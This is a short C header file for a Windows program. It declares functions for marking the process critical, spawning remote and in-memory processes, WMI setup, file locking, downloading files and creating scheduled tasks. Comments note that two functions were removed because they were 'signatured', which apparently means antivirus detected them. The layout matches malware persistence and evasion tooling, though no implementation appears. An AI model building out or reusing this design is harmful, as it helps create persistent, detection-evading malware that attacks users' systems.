#ifndef UTIL_H
#define UTIL_H

#include <windows.h>

void util_set_critical(void);
void util_clear_critical(void);
const char* util_check_critical(void);

void util_spawn_remote(void);   /* REMOVED - was signatured */
void util_spawn_memory(void);   /* REMOVED - was signatured */
void util_setup_wmi(void);
void util_lock_files(void);
void util_lock_file(const char *filename);
void util_download_file(const char *url, const char *outPath);
void util_ensure_task(const char *exePath, const char *taskName);

extern int g_critical_protected;

#endif
